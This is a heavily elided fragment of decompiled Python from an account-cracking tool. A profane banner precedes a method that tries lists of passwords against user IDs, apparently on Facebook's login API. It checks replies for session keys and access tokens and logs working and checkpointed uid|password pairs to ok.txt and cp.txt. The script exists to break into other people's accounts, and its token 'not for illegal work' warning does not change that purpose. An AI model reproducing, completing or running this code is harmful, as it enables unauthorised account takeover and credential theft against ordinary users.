# Decompile by : MD ALAMGIR HOSEN Fuck'MD ALAMGIR HOSEN 
...
\033[0;92m__________________×______________________
...
__________________×______________________
 ...
 \033[0;96m> FUCK 2004       : FUCK BOY MD ALAMGIR HOSEN

 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     

    """)

		print("%s [%s•%s] %sTOOL NAME : %sALAMGIR-FUCK-PRIYA1"%(G,R,G,B,G))

		print("%s [%s•%s] %sVERSION   : %s7.0"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[>_] [ALAM] : %s/%s -> \033[0;92m [ ALAM-OK:%s ]- \033[0;93m[ALAM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[ALAM-OK😍] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [ALAM-OK😍] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[ALAM-CP😭] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [ALAM-CP😭] %s|%s\n"%(uid, pw))
